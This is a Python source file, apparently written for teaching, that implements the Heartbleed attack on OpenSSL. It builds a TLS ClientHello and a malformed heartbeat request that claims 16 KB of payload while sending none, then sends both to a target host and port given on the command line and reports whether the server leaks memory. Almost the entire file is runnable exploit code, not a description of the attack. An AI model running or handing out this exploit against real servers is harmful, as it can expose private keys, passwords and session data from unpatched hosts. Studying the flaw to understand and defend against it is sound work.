'''
Written by Venetia Papadopoulouv (2024)
Refactoring by K.A. Draziotis    (Feb. 2025)
GPL v3.0

'''

# Implementing the Heartbleed Attack
import struct
import sys
import socket


# Dictionary that matches the TLS version to a corresponding hex value
versions = {
    "TLSv1.0": 0x01,
    "TLSv1.1": 0x02,
    "TLSv1.2": 0x03,
    "TLSv1.3": 0x04
}

def tls_version_from_number(num):
    mapping = {
        768: "SSL 3.0",
        769: "TLS 1.0",
        770: "TLS 1.1",
        771: "TLS 1.2",
        772: "TLS 1.3"
    }
    # Return None if the version number isn't in the mapping
    return mapping.get(num)

# Connect to the given ip address (target) through the given port
def connect(target, port):
    # Try and create a connection to the target
    try:
        # Connect to the server
        # AF_INET : Address Family: Internet  ->  specifies that the socket will use the IPv4 protocol
        # SOCK_STREAM  ->  indicates that this will be a TCP socket
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((target, port))
        return sock

    except Exception as e:
        print(f"An error occurred: {e}")
        return None


# Create a ClientHello message according to the given TLS version
def constructClientHello(ver):
    client_hello = [
        # TLS header
        0x16,  # Content type (0x16 for handshake)
        0x03, ver,  # TLS version # you have to compute this
        0x00, 0xdc,  # Length
        # Handshake header
        0x01,  # Type (0x01 for ClientHello)
        0x00, 0x00, 0xd8,  # Length
        0x03, ver,  # TLS version
        # Random
        0x53, 0x43, 0x5b, 0x90, 0x9d, 0x9b, 0x72, 0x0b,
        0xbc, 0x0c, 0xbc, 0x2b, 0x92, 0xa8, 0x48, 0x97,
        0xcf, 0xbd, 0x39, 0x04, 0xcc, 0x16, 0x0a, 0x85,
        0x03, 0x90, 0x9f, 0x77, 0x04, 0x33, 0xd4, 0xde,
        0x00,  # Session ID length
        0x00, 0x66,  # Cipher suites length
        # Cipher suites (51 suites)
        0xc0, 0x14, 0xc0, 0x0a, 0xc0, 0x22, 0xc0, 0x21,
        0x00, 0x39, 0x00, 0x38, 0x00, 0x88, 0x00, 0x87,
        0xc0, 0x0f, 0xc0, 0x05, 0x00, 0x35, 0x00, 0x84,
        0xc0, 0x12, 0xc0, 0x08, 0xc0, 0x1c, 0xc0, 0x1b,
        0x00, 0x16, 0x00, 0x13, 0xc0, 0x0d, 0xc0, 0x03,
        0x00, 0x0a, 0xc0, 0x13, 0xc0, 0x09, 0xc0, 0x1f,
        0xc0, 0x1e, 0x00, 0x33, 0x00, 0x32, 0x00, 0x9a,
        0x00, 0x99, 0x00, 0x45, 0x00, 0x44, 0xc0, 0x0e,
        0xc0, 0x04, 0x00, 0x2f, 0x00, 0x96, 0x00, 0x41,
        0xc0, 0x11, 0xc0, 0x07, 0xc0, 0x0c, 0xc0, 0x02,
        0x00, 0x05, 0x00, 0x04, 0x00, 0x15, 0x00, 0x12,
        0x00, 0x09, 0x00, 0x14, 0x00, 0x11, 0x00, 0x08,
        0x00, 0x06, 0x00, 0x03, 0x00, 0xff,
        0x01,  # Compression methods length
        0x00,  # Compression method (0x00 for NULL)
        0x00, 0x49,  # Extensions length
        # Extension: ec_point_formats
        0x00, 0x0b, 0x00, 0x04, 0x03, 0x00, 0x01, 0x02,
        # Extension: elliptic_curves
        0x00, 0x0a, 0x00, 0x34, 0x00, 0x32, 0x00, 0x0e,
        0x00, 0x0d, 0x00, 0x19, 0x00, 0x0b, 0x00, 0x0c,
        0x00, 0x18, 0x00, 0x09, 0x00, 0x0a, 0x00, 0x16,
        0x00, 0x17, 0x00, 0x08, 0x00, 0x06, 0x00, 0x07,
        0x00, 0x14, 0x00, 0x15, 0x00, 0x04, 0x00, 0x05,
        0x00, 0x12, 0x00, 0x13, 0x00, 0x01, 0x00, 0x02,
        0x00, 0x03, 0x00, 0x0f, 0x00, 0x10, 0x00, 0x11,
        # Extension: SessionTicket TLS
        0x00, 0x23, 0x00, 0x00,
        # Extension: Heartbeat
        0x00, 0x0f, 0x00, 0x01, 0x01
    ]
    return client_hello

# Create a Heartbeat message using the given TLS version
def constructHeartbeat(ver):
    heartbeat = [
        0x18,  # Content type (Heartbeat)
        0x03, ver,  # TLS version
        0x00, 0x03,  # Length
        # Payload
        0x01,  # Type (Request)
        0x40, 0x00  # Payload length
    ]
    return heartbeat


# Get the server's response
def getResponse(sock):
    try:
        header = sock.recv(5)  # Get the first 5 bytes (the header) of the response
        if not header:
            print('Unexpected EOF -> Header')
            return None, None, None

        # '>': network order, 'B': unsigned char (1 byte), 'H': unsigned short (2 bytes)
        message_type, ver, length = struct.unpack('>BHH', header)
        #print(f"RESPONSE: {message_type}, {ver}, {length}")

# Get the rest of the message
        payload = b''
        while len(payload) != length:
            payload += sock.recv(length - len(payload))

        if not payload:
            print('Unexpected EOF -> message')
            return None, None, None

        #print(payload[0])
        #print()
        return message_type, ver, payload

    except Exception as e:
        print(f"Error receiving response: {e}")
        return None, None, None


# Send the ClientHello message to the server and
# return the server's TLS version and the specific type of the server's response
# (the first byte of the payload specifies even further (than the type) what kind of message this is)
def sendClientHello(sock, client_hello):
    if sock is None:
        print("Failed to connect to the server.")
        exit(1)
    sock.send(bytes(client_hello))
    t, v, m = getResponse(sock)  # type, version, message/payload

    if t is None:
        print("Server didn't send ServerHello. Probably is secure.")
        sys.exit()      # terminate the program
    elif t == 21:   # type 21 -> alert message
        #print("Something went wrong. Server sent an alert message.")
        print("Secure")
        #printResults(m)
        #sys.exit()
        return v,m[0]
    elif t == 22:
        return v, m[0]


# Send the Heartbeat message to the server and print a corresponding message according to the server's response
def sendHeartbeat(sock, heartbeat):
    sock.send(bytes(heartbeat))

    # While the server's response isn't of type 24 or 21 (or no type, meaning no response) read the
    # messages that the server is sending
    while True:
        t, v, m = getResponse(sock)

        if t is None:
            print('No Heartbeat response received.')
            print('Secure.')
            #sys.exit()

        # type 24 -> Heartbeat related message
        if t == 24:
            if len(m) > 3:
                print('Server is vulnerable.')
            else:
                print('FAILURE! Heartbeat response received, but no extra data were sent.')
                print('Secure.')
            return m

        # Warning message
        if t == 21:
            print('ALERT! Server returned error.')
            print('Secure.')
            #printResults(m)
            #sys.exit()


# Hex dumps the given byte string
def printResults(byte_string):
    for i in range(0, len(byte_string), 16):
        # Get 16 bytes
        chunk = byte_string[i:i + 16]

        # The hexadecimal values of the chunk
        hex_val = ' '.join(f'{byte:02X}' for byte in chunk)
        # The ascii values of the chunk (if they are printable, else a '.' (dot))
        ascii_val = ''.join(chr(byte) if 32 <= byte <= 126 else '.' for byte in chunk)

        print(f'{i:04X}: {hex_val:<48} {ascii_val}')

    print()


if __name__ == '__main__':
    if len(sys.argv) < 2:
        print("Usage: python3 heartbleed.py [ip_address] [port_number]")
        sys.exit(1)

    ip_address = sys.argv[1]

    # If the port argument isn't provided, default to 443.
    if len(sys.argv) < 3 or not sys.argv[2]:
        port = 443
    else:
        port = int(sys.argv[2])

    # Since we do not know the TLS version the server supports, we'll use TLSv1.2,
    # as the highest mutually supported version will be selected for the session
    version = "TLSv1.3"  # the attacker's TLS version (NOT the server's)

    # Connect to the server
    sock = connect(ip_address, port)
    #print(f"version of localhost: {version}")
    

    # Create and send a ClientHello message
    ch = constructClientHello(versions.get(version))
    server_version, message_type = sendClientHello(sock, ch)
    server_version_1 = tls_version_from_number(server_version)
    #print(f"server version: {server_version_1}")
    #print(f"message type: {message_type}")

    # Keep reading the server's messages until it sends a ServerHelloDone message
    while True:
        t, v, p = getResponse(sock)
        if t is None:
            print('Server closed connection without sending ServerHello.')
            sys.exit()
        if t == 22 and p[0] == 0x0E:    # ServerHelloDone message
            break

    # Create and send a Heartbeat message & then read the server's response
    hb = constructHeartbeat(server_version & 0xFF)
    print('Heartbeat constructed.')
    #print(hb)
    #print()
    response = sendHeartbeat(sock, hb)

    # Print (hex dump) the server's Heartbeat response

    #print('Heartbeat results: ')
    #printResults(response)
